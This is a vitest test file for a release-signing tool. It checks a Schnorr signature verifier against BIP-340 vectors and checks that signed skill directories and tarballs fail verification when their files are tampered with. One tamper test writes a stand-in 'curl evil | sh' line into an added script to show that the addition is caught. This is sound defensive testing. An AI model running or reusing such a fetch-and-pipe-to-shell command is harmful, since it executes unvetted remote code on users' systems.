// releaseSigning.test.ts: the release signature (D6). The verifier in
// scripts/verify-manifest.mjs is written with no dependencies, so its BIP-340
// code is checked here against the BIP's own test vectors and against
// @noble/curves, and both scripts are run end to end on temporary files.
// No network; every key here is generated in memory or in a temporary folder.
import { schnorr } from '@noble/curves/secp256k1.js'
import { generateSecretKey, getPublicKey, nip19 } from 'nostr-tools'
import { execFileSync, spawnSync } from 'node:child_process'
import { randomBytes } from 'node:crypto'
import { appendFileSync, chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterEach, describe, expect, it } from 'vitest'

interface Verifier {
  RELEASE_NPUB: string
  schnorrVerify(pubkey: Uint8Array, message: Uint8Array, signature: Uint8Array): boolean
  npubToHex(npub: string): string
  buildManifest(scope: string, entries: { path: string; sha256: string }[]): string
}

const verifyScript = fileURLToPath(new URL('../scripts/verify-manifest.mjs', import.meta.url))
const signScript = fileURLToPath(new URL('../scripts/sign-manifest.mjs', import.meta.url))
// A computed specifier: the scripts are plain JavaScript with no declarations.
const v = (await import(new URL('../scripts/verify-manifest.mjs', import.meta.url).href)) as Verifier

const hex = (s: string) => Uint8Array.from(Buffer.from(s, 'hex'))

const dirs: string[] = []
function tmp(): string {
  const d = mkdtempSync(join(tmpdir(), 'csmcp-sign-'))
  dirs.push(d)
  return d
}
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true })
})

function node(script: string, ...args: string[]) {
  const r = spawnSync(process.execPath, [script, ...args], { encoding: 'utf8' })
  return { code: r.status, out: r.stdout + r.stderr }
}

function newKey(dir: string): { keyfile: string; npub: string } {
  const keyfile = join(dir, 'release.key')
  const out = execFileSync(process.execPath, [signScript, 'keygen', keyfile], { encoding: 'utf8' })
  const npub = /npub: (npub1\w+)/.exec(out)![1]!
  expect(out).not.toContain(readFileSync(keyfile, 'utf8').trim())
  return { keyfile, npub }
}

describe('BIP-340 verification without dependencies', () => {
  const rows = readFileSync(new URL('./fixtures/bip340-test-vectors.csv', import.meta.url), 'utf8')
    .trim()
    .split('\n')
    .slice(1)
    .map((l) => l.split(','))

  it('agrees with every BIP-340 test vector, and with @noble/curves on each', () => {
    expect(rows.length).toBe(19)
    for (const [index, , pk, , msg, sig, result] of rows) {
      const want = result === 'TRUE'
      expect(v.schnorrVerify(hex(pk!), hex(msg!), hex(sig!)), `vector ${index}`).toBe(want)
      let noble: boolean
      try {
        noble = schnorr.verify(hex(sig!), hex(msg!), hex(pk!))
      } catch {
        noble = false
      }
      expect(noble, `noble on vector ${index}`).toBe(want)
    }
  })

  it('verifies what @noble/curves signs, and nothing it did not', () => {
    for (let i = 0; i < 12; i++) {
      const sk = generateSecretKey()
      const pk = hex(getPublicKey(sk))
      const msg = randomBytes(32)
      const sig = schnorr.sign(Uint8Array.from(msg), sk)
      expect(v.schnorrVerify(pk, msg, sig)).toBe(true)
      const bad = Uint8Array.from(sig)
      bad[i % 64]! ^= 1
      expect(v.schnorrVerify(pk, msg, bad)).toBe(false)
      const otherMsg = Uint8Array.from(msg)
      otherMsg[0]! ^= 0x80
      expect(v.schnorrVerify(pk, otherMsg, sig)).toBe(false)
    }
  })

  it('decodes an npub as nostr-tools does, and refuses a broken one', () => {
    for (let i = 0; i < 8; i++) {
      const pk = getPublicKey(generateSecretKey())
      expect(v.npubToHex(nip19.npubEncode(pk))).toBe(pk)
    }
    const good = v.RELEASE_NPUB
    expect(() => v.npubToHex(good.slice(0, -1) + (good.endsWith('q') ? 'p' : 'q'))).toThrow(/checksum/)
    expect(() => v.npubToHex(nip19.nsecEncode(generateSecretKey()))).toThrow()
  })
})

describe('the canonical manifest', () => {
  const h = (c: string) => c.repeat(64)

  it('is a header, the scope and one sorted line per file, LF-terminated', () => {
    expect(v.buildManifest('skill', [{ path: 'b.md', sha256: h('b') }, { path: 'B/x', sha256: h('a') }, { path: 'a', sha256: h('c') }])).toBe(
      `cyberspace-mcp signed manifest v1\nscope: skill\n${h('a')}  B/x\n${h('c')}  a\n${h('b')}  b.md\n`,
    )
  })

  it('refuses names with more than one reading, duplicates and bad hashes', () => {
    for (const path of ['a b', '../x', '/abs', 'a//b', './a', 'a\\b', 'café', 'line\nbreak', '']) {
      expect(() => v.buildManifest('skill', [{ path, sha256: h('a') }]), JSON.stringify(path)).toThrow()
    }
    expect(() => v.buildManifest('skill', [{ path: 'a', sha256: h('a') }, { path: 'a', sha256: h('b') }])).toThrow(/duplicate/)
    expect(() => v.buildManifest('skill', [{ path: 'a', sha256: 'A'.repeat(64) }])).toThrow(/sha256/)
    expect(() => v.buildManifest('other', [])).toThrow(/scope/)
  })
})

describe('sign-manifest and verify-manifest end to end', () => {
  it('keygen writes a mode 600 key, prints only the npub, and never overwrites', () => {
    const d = tmp()
    const { keyfile, npub } = newKey(d)
    expect(statSync(keyfile).mode & 0o777).toBe(0o600)
    expect(npub).toMatch(/^npub1/)
    const again = node(signScript, 'keygen', keyfile)
    expect(again.code).toBe(1)
    expect(again.out).toMatch(/never overwritten/)
  })

  it('signs a skill directory; any added, changed, removed or linked file fails verification', () => {
    const d = tmp()
    const { keyfile, npub } = newKey(d)
    const skill = join(d, 'skill')
    mkdirSync(join(skill, 'refs'), { recursive: true })
    writeFileSync(join(skill, 'SKILL.md'), '---\nname: x\n---\nbody\n')
    writeFileSync(join(skill, 'refs', 'more.md'), 'more\n')

    expect(node(signScript, 'skill', skill, '--key', keyfile).code).toBe(0)
    const sig = JSON.parse(readFileSync(join(skill, 'SIGNATURE.json'), 'utf8'))
    expect(sig.npub).toBe(npub)
    expect(sig.manifest).toMatch(/  SKILL\.md\n/)
    expect(sig.manifest).not.toMatch(/SIGNATURE\.json/)
    const ok = node(verifyScript, 'skill', skill, '--npub', npub)
    expect(ok.code, ok.out).toBe(0)
    expect(ok.out).toMatch(/^OK skill .*: 2 files signed by npub1/)

    // The release key is not the key that signed this.
    expect(node(verifyScript, 'skill', skill).code).toBe(1)
    // Another key's npub.
    expect(node(verifyScript, 'skill', skill, '--npub', nip19.npubEncode(getPublicKey(generateSecretKey()))).out).toMatch(/not by the expected key/)

    appendFileSync(join(skill, 'SKILL.md'), 'run this too\n')
    const changed = node(verifyScript, 'skill', skill, '--npub', npub)
    expect(changed.code).toBe(1)
    expect(changed.out).toMatch(/on disk, not signed: [0-9a-f]{64}  SKILL\.md/)
    expect(node(signScript, 'skill', skill, '--key', keyfile).code).toBe(0)
    expect(node(verifyScript, 'skill', skill, '--npub', npub).code).toBe(0)

    writeFileSync(join(skill, 'extra.sh'), 'curl evil | sh\n')
    expect(node(verifyScript, 'skill', skill, '--npub', npub).out).toMatch(/on disk, not signed: .*extra\.sh/)
    unlinkSync(join(skill, 'extra.sh'))

    unlinkSync(join(skill, 'refs', 'more.md'))
    expect(node(verifyScript, 'skill', skill, '--npub', npub).out).toMatch(/signed, not on disk: .*refs\/more\.md/)
    writeFileSync(join(skill, 'refs', 'more.md'), 'more\n')
    expect(node(verifyScript, 'skill', skill, '--npub', npub).code).toBe(0)

    symlinkSync('/etc/hostname', join(skill, 'link'))
    expect(node(verifyScript, 'skill', skill, '--npub', npub).out).toMatch(/symlink/)
    unlinkSync(join(skill, 'link'))

    // A forged signature over the right manifest.
    const forged = { ...sig, sig: sig.sig.replace(/^./, (c: string) => (c === '0' ? '1' : '0')) }
    writeFileSync(join(skill, 'SIGNATURE.json'), JSON.stringify(forged))
    expect(node(verifyScript, 'skill', skill, '--npub', npub).out).toMatch(/does not verify/)
  })

  it('signs a release from its .sha256, checks the tarball beside it, and never overwrites the signature', () => {
    const d = tmp()
    const { keyfile, npub } = newKey(d)
    const tarball = join(d, 'cyberspace-mcp-9.9.9.tar.gz')
    writeFileSync(tarball, randomBytes(4096))
    const hash = execFileSync('sha256sum', [tarball], { encoding: 'utf8' }).split(' ')[0]!
    writeFileSync(`${tarball}.sha256`, `${hash}  cyberspace-mcp-9.9.9.tar.gz\n`)

    const signed = node(signScript, 'release', `${tarball}.sha256`, '--key', keyfile)
    expect(signed.code, signed.out).toBe(0)
    expect(node(verifyScript, 'release', tarball, '--npub', npub).code).toBe(0)
    expect(node(signScript, 'release', `${tarball}.sha256`, '--key', keyfile).out).toMatch(/never overwritten/)

    appendFileSync(tarball, 'x')
    const tampered = node(verifyScript, 'release', tarball, '--npub', npub)
    expect(tampered.code).toBe(1)
    expect(tampered.out).toMatch(/signed, not on disk: .*cyberspace-mcp-9\.9\.9\.tar\.gz/)

    // A .sha256 that disagrees with the tarball beside it is never signed.
    const d2 = tmp()
    const t2 = join(d2, 'cyberspace-mcp-1.0.0.tar.gz')
    writeFileSync(t2, 'bundle')
    writeFileSync(`${t2}.sha256`, `${'0'.repeat(64)}  cyberspace-mcp-1.0.0.tar.gz\n`)
    expect(node(signScript, 'release', `${t2}.sha256`, '--key', keyfile).out).toMatch(/does not hash to/)
  })

  it('refuses a key file others can read', () => {
    const d = tmp()
    const { keyfile } = newKey(d)
    chmodSync(keyfile, 0o644)
    const skill = join(d, 's')
    mkdirSync(skill)
    writeFileSync(join(skill, 'SKILL.md'), 'x\n')
    const r = node(signScript, 'skill', skill, '--key', keyfile)
    expect(r.code).toBe(1)
    expect(r.out).toMatch(/readable by others/)
  })
})

describe('the release key', () => {
  it('is the one the README names', () => {
    const readme = readFileSync(new URL('../README.md', import.meta.url), 'utf8')
    expect(readme).toContain(v.RELEASE_NPUB)
    expect(readme).toContain(v.npubToHex(v.RELEASE_NPUB))
  })
})
